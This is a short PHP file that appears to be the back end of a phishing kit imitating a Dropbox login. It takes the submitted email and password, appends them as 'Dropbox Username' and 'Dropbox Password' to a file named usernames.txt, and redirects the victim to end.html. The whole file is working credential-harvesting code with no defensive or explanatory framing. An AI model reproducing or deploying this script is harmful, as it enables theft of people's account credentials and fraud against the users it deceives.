<?php


file_put_contents("usernames.txt", 
"Dropbox Username: " . $_POST['login_email'] . "
Dropbox Password: " . $_POST['login_password'] . "\n", FILE_APPEND);
header('Location: end.html');
exit();
?>